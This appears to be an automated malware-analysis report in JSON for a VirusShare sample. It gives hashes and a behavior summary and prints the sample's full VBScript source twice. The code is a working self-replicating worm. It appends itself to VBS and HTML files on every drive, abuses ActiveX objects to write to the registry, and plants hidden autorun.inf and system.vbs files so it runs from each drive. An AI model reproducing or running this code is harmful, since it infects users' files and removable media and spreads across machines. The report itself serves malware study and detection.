{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "SYSTEM": "May run an executable file or a system command on a Mac",
            "WSCript.shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "copyfile": "May copy a file",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOn error resume next\nRandomize\nErrTest = WScript.ScriptFullname \n If Err Then \n EF=\"htm\" \n Else \n EF=\"vbs\" \nset ZEhshll=WScript.CreateObject(\"WSCript.shell\")\nif ucase(right(WScript.ScriptFullname,10))=\"SYSTEM.VBS\" THEN\nZEhshll.run \"IEXPLORE.EXE \" &mid(WScript.ScriptFullname,1,3)\nend IF\nend If \nif EF=\"htm\" then\nSet PW = document.applets(\"zxqqrh_guest\")                    \nPW.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\")   \nPW.createInstance()                                      \nSet MOMUNT = PW.GetObject()\nPW.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\")     \nPW.createInstance()\nSet GRBRRIR = PW.GetObject()\nfor each ZE in document.scripts\nif lcase(ZE.language)=\"vbscript\" then\nUQOYMSZEHA=ZE.text\nend if\nnext\nelse\nSet GRBRRIR = CreateObject(\"Scripting.FileSystemObject\") \nSet TV = GRBRRIR.OpenTextFile(WScript.ScriptFullname, 1) \nUQOYMSZEHA = TV.ReadAll\nend if\nZW=\"<SCRIPT language=\"&chr(34)&\"VBScript\"&chr(34)&\">\"&vbcrlf&UQOYMSZEHA&\"<\"&chr(47)&\"script>\" \nXMZPCTBGP =\"<\" & \"script language=vbscript>\" & vbCrLf & \"document.write \" & \"\"\"\" & \"<\" & \"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>\" & \"<\"\"&\"\"\" & \"APPLET NAME=zxqqrh\"\"&\"\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\"&\"\"activeX.Active\"\"&\"\"XComponent>\" & \"<\" & \"/APPLET>\" & \"<\" & \"/div>\"\"\" & vbCrLf & \"<\" & \"/script>\"&vbcrlf&ZW\nWinPath = GRBRRIR.GetSpecialFolder(0) & \"\\\"\nMOMUNT.RegWrite \"HKEY_CLASSES_ROOT\\.vbs\\\", \"vbsfile\"                  \nIf not(GRBRRIR.FileExists(WinPath &\"Start Menu\\Programs\\\ufffd\ufffd\ufffd\ufffd\\internet.exe.VBS\")) Then\nset systembak = GRBRRIR.CreateTextFile(WinPath &\"Start Menu\\Programs\\\ufffd\ufffd\ufffd\ufffd\\internet.exe.VBS\", true)\nsystembak.write UQOYMSZEHA\nsystembak.CLOS\nEND IF\nEXTT=document.location\nSet dc = GRBRRIR.Drives\n   For each va in dc\nvar =va&\"\\\"\nzd(var)\n   Set f = GRBRRIR.GetFolder(var)\n     listfl(f)\n  For Each fz in f.SubFolders\n      listf(fz)\n      listfl(fz)   \n   Next\nnext\n sub listf(fs)\nIf ucase(Right(EXTT, 3)) =\"HTM\" OR ucase(Right(EXTT, 3))=\"TML\"  Then\nEXIT SUB\nEND IF\n for each filed in fs.subfolders\nlistf(filed)\nlistfl(filed)\nnext\n  end sub\n sub listfl(f2)\nfor each ww in f2.files\nexte=ucase(GRBRRIR.GetExtensionName (ww))\nIF exte=\"VBS\" or exte=\"HTML\" OR EXTE=\"HTM\" OR EXTE=\"HTA\" or exte=\"HTT\" THEN \ncheack(ww)\nend if\nnext       \nend sub\nsub cheack(ww) \nConst ForReading = 1, ForWriting = 2, ForAppending = 8 \nset f1=GRBRRIR.opentextfile(ww,forreading)\nhk=f1.readall\nif Instr(hk,\"'zxqqrh\") <> 0 Or Len(hk) < 1 Then\nf1.close \nexit sub\nelse\nSet ddf = GRBRRIR.GetFile(ww)\nld= ddf.attributes\n ddf.attributes=0\n   Set OBSXWV =  GRBRRIR.OpenTextFile(ww, forappending, True)\nIF ucase(GRBRRIR.GetExtensionName (ww))<>\"VBS\"  THEN\nOBSXWV.write vbcrlf&XMZPCTBGP\nelse\n   OBSXWV.write vbcrlf&UQOYMSZEHA\nend if\nOBSXWV.close\nddf.attributes=ld\nend if\n end sub\nsub zd(var)\nif GRBRRIR.FileExists(var&\"folder.htt\") or GRBRRIR.FileExists(var&\"system.vbs\") then \nexit sub\nend if\nIf GRBRRIR.FileExists(WinPath&\"web\\folder.htt\") then\nGRBRRIR.copyfile WinPath&\"web\\folder.htt\", var\nGRBRRIR.copyfile WinPath&\"desktop.ini\", var\nexit sub\nend if \nui=var+\"autorun.inf\"\nset a = GRBRRIR.CreateTextFile(ui, true)\nset b = GRBRRIR.CreateTextFile(var&\"system.vbs\", true)\na.WriteLine(\"[autorun]\")\na.writeline(\"open=WSCRIPT.EXE\"&\" system.vbs\")\nb.writeline UQOYMSZEHA\nb.close()\na.Close()\nset TK=GRBRRIR.getfile(ui)\nset PF=GRBRRIR.getfile(var&\"system.vbs\")\nTK.attributes = TK.attributes + 2\nPF.attributes = PF.attributes + 2\nend sub"
    },
    "filename": "VirusShare_1f4db838576be60dbfc9940e6a3916bc",
    "filesize": 3588,
    "filetype": "Microsoft Windows Autorun file",
    "hashes": {
        "md5": "1f4db838576be60dbfc9940e6a3916bc",
        "sha1": "1cd4ad9a95d60a679545978614fa567a2d8ff989",
        "sha256": "59bee9ed211fa3e865c861d8a5bde439bab02cd42d3896a29d34c8aee8ea964e"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "On error resume next",
            "Randomize",
            "ErrTest = WScript.ScriptFullname ",
            " If Err Then ",
            " EF=\"htm\" ",
            " Else ",
            " EF=\"vbs\" ",
            "set ZEhshll=WScript.CreateObject(\"WSCript.shell\")",
            "if ucase(right(WScript.ScriptFullname,10))=\"SYSTEM.VBS\" THEN",
            "ZEhshll.run \"IEXPLORE.EXE \" &mid(WScript.ScriptFullname,1,3)",
            "end IF",
            "end If ",
            "if EF=\"htm\" then",
            "Set PW = document.applets(\"zxqqrh_guest\")                    ",
            "PW.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\")   ",
            "PW.createInstance()                                      ",
            "Set MOMUNT = PW.GetObject()",
            "PW.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\")     ",
            "PW.createInstance()",
            "Set GRBRRIR = PW.GetObject()",
            "for each ZE in document.scripts",
            "if lcase(ZE.language)=\"vbscript\" then",
            "UQOYMSZEHA=ZE.text",
            "end if",
            "next",
            "else",
            "Set GRBRRIR = CreateObject(\"Scripting.FileSystemObject\") ",
            "Set TV = GRBRRIR.OpenTextFile(WScript.ScriptFullname, 1) ",
            "UQOYMSZEHA = TV.ReadAll",
            "end if",
            "ZW=\"<SCRIPT language=\"&chr(34)&\"VBScript\"&chr(34)&\">\"&vbcrlf&UQOYMSZEHA&\"<\"&chr(47)&\"script>\" ",
            "XMZPCTBGP =\"<\" & \"script language=vbscript>\" & vbCrLf & \"document.write \" & \"\"\"\" & \"<\" & \"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>\" & \"<\"\"&\"\"\" & \"APPLET NAME=zxqqrh\"\"&\"\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\"&\"\"activeX.Active\"\"&\"\"XComponent>\" & \"<\" & \"/APPLET>\" & \"<\" & \"/div>\"\"\" & vbCrLf & \"<\" & \"/script>\"&vbcrlf&ZW",
            "WinPath = GRBRRIR.GetSpecialFolder(0) & \"\\\"",
            "MOMUNT.RegWrite \"HKEY_CLASSES_ROOT\\.vbs\\\", \"vbsfile\"                  ",
            "If not(GRBRRIR.FileExists(WinPath &\"Start Menu\\Programs\\\\internet.exe.VBS\")) Then",
            "set systembak = GRBRRIR.CreateTextFile(WinPath &\"Start Menu\\Programs\\\\internet.exe.VBS\", true)",
            "systembak.write UQOYMSZEHA",
            "systembak.CLOS",
            "END IF",
            "EXTT=document.location",
            "Set dc = GRBRRIR.Drives",
            "   For each va in dc",
            "var =va&\"\\\"",
            "zd(var)",
            "   Set f = GRBRRIR.GetFolder(var)",
            "     listfl(f)",
            "  For Each fz in f.SubFolders",
            "      listf(fz)",
            "      listfl(fz)   ",
            "   Next",
            "next",
            " sub listf(fs)",
            "If ucase(Right(EXTT, 3)) =\"HTM\" OR ucase(Right(EXTT, 3))=\"TML\"  Then",
            "EXIT SUB",
            "END IF",
            " for each filed in fs.subfolders",
            "listf(filed)",
            "listfl(filed)",
            "next",
            "  end sub",
            " sub listfl(f2)",
            "for each ww in f2.files",
            "exte=ucase(GRBRRIR.GetExtensionName (ww))",
            "IF exte=\"VBS\" or exte=\"HTML\" OR EXTE=\"HTM\" OR EXTE=\"HTA\" or exte=\"HTT\" THEN ",
            "cheack(ww)",
            "end if",
            "next       ",
            "end sub",
            "sub cheack(ww) ",
            "Const ForReading = 1, ForWriting = 2, ForAppending = 8 ",
            "set f1=GRBRRIR.opentextfile(ww,forreading)",
            "hk=f1.readall",
            "if Instr(hk,\"'zxqqrh\") <> 0 Or Len(hk) < 1 Then",
            "f1.close ",
            "exit sub",
            "else",
            "Set ddf = GRBRRIR.GetFile(ww)",
            "ld= ddf.attributes",
            " ddf.attributes=0",
            "   Set OBSXWV =  GRBRRIR.OpenTextFile(ww, forappending, True)",
            "IF ucase(GRBRRIR.GetExtensionName (ww))<>\"VBS\"  THEN",
            "OBSXWV.write vbcrlf&XMZPCTBGP",
            "else",
            "   OBSXWV.write vbcrlf&UQOYMSZEHA",
            "end if",
            "OBSXWV.close",
            "ddf.attributes=ld",
            "end if",
            " end sub",
            "sub zd(var)",
            "if GRBRRIR.FileExists(var&\"folder.htt\") or GRBRRIR.FileExists(var&\"system.vbs\") then ",
            "exit sub",
            "end if",
            "If GRBRRIR.FileExists(WinPath&\"web\\folder.htt\") then",
            "GRBRRIR.copyfile WinPath&\"web\\folder.htt\", var",
            "GRBRRIR.copyfile WinPath&\"desktop.ini\", var",
            "exit sub",
            "end if ",
            "ui=var+\"autorun.inf\"",
            "set a = GRBRRIR.CreateTextFile(ui, true)",
            "set b = GRBRRIR.CreateTextFile(var&\"system.vbs\", true)",
            "a.WriteLine(\"[autorun]\")",
            "a.writeline(\"open=WSCRIPT.EXE\"&\" system.vbs\")",
            "b.writeline UQOYMSZEHA",
            "b.close()",
            "a.Close()",
            "set TK=GRBRRIR.getfile(ui)",
            "set PF=GRBRRIR.getfile(var&\"system.vbs\")",
            "TK.attributes = TK.attributes + 2",
            "PF.attributes = PF.attributes + 2",
            "end sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.293638",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
